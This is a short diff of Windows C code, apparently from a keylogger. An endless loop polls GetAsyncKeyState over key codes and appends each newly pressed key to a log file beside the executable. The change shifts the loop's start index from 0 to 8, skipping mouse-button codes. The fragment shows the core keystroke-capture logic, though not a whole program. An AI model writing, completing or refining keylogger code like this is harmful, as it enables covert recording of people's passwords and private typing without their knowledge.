@@ -21,7 +21,7 @@ int main(int argc, char **argv){
     PathRemoveFileSpec(path);
     snprintf(fullpath, LEN_NAME - 1, "%s\\%s", path, KEY_LOG);
     while(true){
-        for(i = 0; i < MAX_STATE; i++){
+        for(i = 8; i < MAX_STATE; i++){
             is_pressed = (GetAsyncKeyState(i) & 0x8000) != 0;
             if(is_pressed && state[i] == false)
                 save_file(fullpath, key_value(i));
